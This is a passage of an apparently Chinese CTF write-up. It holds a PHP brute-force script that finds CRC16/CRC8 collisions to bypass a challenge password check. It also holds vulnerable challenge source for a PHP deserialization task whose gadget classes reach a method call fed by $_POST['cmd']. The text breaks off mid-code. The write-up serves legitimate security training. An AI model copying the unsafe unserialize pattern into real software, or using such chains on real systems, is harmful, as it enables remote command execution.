+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $checksum;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">calculate_crc8</span>($input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> $crc8_table <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x15</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x2A</span>, <span style="color:#ae81ff">0x2D</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x65</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x5D</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0xFB</span>, <span style="color:#ae81ff">0xF2</span>, <span style="color:#ae81ff">0xF5</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xCD</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x85</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0xAF</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0xB4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0xBD</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0xCE</span>, <span style="color:#ae81ff">0xDB</span>, <span style="color:#ae81ff">0xDC</span>, <span style="color:#ae81ff">0xD5</span>, <span style="color:#ae81ff">0xD2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xF8</span>, <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0xF6</span>, <span style="color:#ae81ff">0xE3</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0xEA</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xB7</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0xB9</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0xAC</span>, <span style="color:#ae81ff">0xA5</span>, <span style="color:#ae81ff">0xA2</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x8F</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0x9A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x2E</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x32</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x1F</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x0A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x4B</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x42</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0x7A</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x8E</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x9C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xB1</span>, <span style="color:#ae81ff">0xB6</span>, <span style="color:#ae81ff">0xBF</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0xAD</span>, <span style="color:#ae81ff">0xAA</span>, <span style="color:#ae81ff">0xA3</span>, <span style="color:#ae81ff">0xA4</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0xE5</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xEC</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xC8</span>, <span style="color:#ae81ff">0xDD</span>, <span style="color:#ae81ff">0xDA</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xD4</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x7C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x1E</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x0C</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x5B</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x63</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x2C</span>, <span style="color:#ae81ff">0x2B</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x1A</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x13</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xAE</span>, <span style="color:#ae81ff">0xA9</span>, <span style="color:#ae81ff">0xA0</span>, <span style="color:#ae81ff">0xA7</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0xB5</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0xBB</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x8A</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x83</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xDE</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0xD7</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xCB</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xFD</span>, <span style="color:#ae81ff">0xF4</span>, <span style="color:#ae81ff">0xF3</span>
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#39;C*&#39;</span>, $input);
+</span></span><span style="display:flex;"><span>    $length <span style="color:#f92672">=</span> <span style="color:#a6e22e">count</span>($bytes);
+</span></span><span style="display:flex;"><span>    $crc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($k <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; $k <span style="color:#f92672">&lt;=</span> $length; $k<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $crc <span style="color:#f92672">=</span> $crc8_table[($crc <span style="color:#f92672">^</span> $bytes[$k]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $crc <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$SECRET_PASS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Enj0yNSSCTF4th!&#34;</span>;
+</span></span><span style="display:flex;"><span>$target_crc16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">compute_crc16</span>($SECRET_PASS);
+</span></span><span style="display:flex;"><span>$target_crc8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate_crc8</span>($SECRET_PASS);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;目标CRC16: </span><span style="color:#e6db74">$target_crc16\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;目标CRC8: </span><span style="color:#e6db74">$target_crc8\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;开始爆破...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$found <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>$attempts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>$found) {
+</span></span><span style="display:flex;"><span>    $attempts<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 生成随机15字节字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $random_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">15</span>; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $random_bytes <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">random_int</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 跳过原始密码
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($random_bytes <span style="color:#f92672">===</span> $SECRET_PASS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    $crc16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">compute_crc16</span>($random_bytes);
+</span></span><span style="display:flex;"><span>    $crc8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate_crc8</span>($random_bytes);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($crc16 <span style="color:#f92672">===</span> $target_crc16 <span style="color:#f92672">&amp;&amp;</span> $crc8 <span style="color:#f92672">===</span> $target_crc8) {
+</span></span><span style="display:flex;"><span>        $found <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;尝试次数: </span><span style="color:#e6db74">$attempts\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;碰撞字符串: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">bin2hex</span>($random_bytes) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;CRC16: </span><span style="color:#e6db74">$crc16</span><span style="color:#e6db74">, CRC8: </span><span style="color:#e6db74">$crc8\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;pass=&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">urlencode</span>($random_bytes) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 显示进度
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($attempts <span style="color:#f92672">%</span> <span style="color:#ae81ff">10000</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;已尝试 </span><span style="color:#e6db74">$attempts</span><span style="color:#e6db74"> 次...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="mpgafilesystem">[mpga]filesystem<a hidden class="anchor" aria-hidden="true" href="#mpgafilesystem">#</a></h2>
+<p>题目给了www.zip备份文件，反序列化漏洞点位于：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($action <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;home&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;submit_md5&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $filename_param <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;file_to_check&#39;</span>]) <span style="color:#f92672">?</span> $_POST[<span style="color:#e6db74">&#39;file_to_check&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($filename_param)) {
+</span></span><span style="display:flex;"><span>        $file_object <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">unserialize</span>($filename_param);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($file_object <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>($file_object <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">FileManager</span>)) {
+</span></span><span style="display:flex;"><span>            $file_object <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileManager</span>($filename_param);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">=</span> $file_object<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getFileHash</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;p class=&#39;text-gray-600&#39;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>submit_md5</code>随便传一个值就能触发unserialize，构造的序列化字符串放在<code>file_to_check</code>传入即可，接下来就是构造链子，先看一下有哪些class：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ApplicationContext</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $contextName; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contextName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ApplicationContext&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contextName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contextName</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ContentProcessor</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $processedContent; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $callbackFunction;   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>(){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">processedContent</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FunctionInvoker</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__get</span>($key){
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">property_exists</span>($this, $key)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_object</span>($this<span style="color:#f92672">-&gt;</span>$key) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callbackFunction</span>)) {
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span>$key<span style="color:#f92672">-&gt;</span>{$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callbackFunction</span>}($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileManager</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $targetFile; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $responseData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;default_response&#39;</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($targetFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span> <span style="color:#f92672">=</span> $targetFile;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filterPath</span>(){ 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^\/|php:|data|zip|\.\.\//i&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;文件路径不符合规范&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">performWriteOperation</span>($var){ 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        $targetObject <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>; 
+</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> $targetObject<span style="color:#f92672">-&gt;</span>$var; 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getFileHash</span>(){ 
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filterPath</span>(); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>)) {
+</span></span><span style="display:flex;"><span>                $md5_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;文件MD5哈希: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($md5_hash);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;文件未找到&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_object</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                $md5_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;文件MD5哈希 (尝试): &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($md5_hash);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">TypeError</span> $e) {
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                
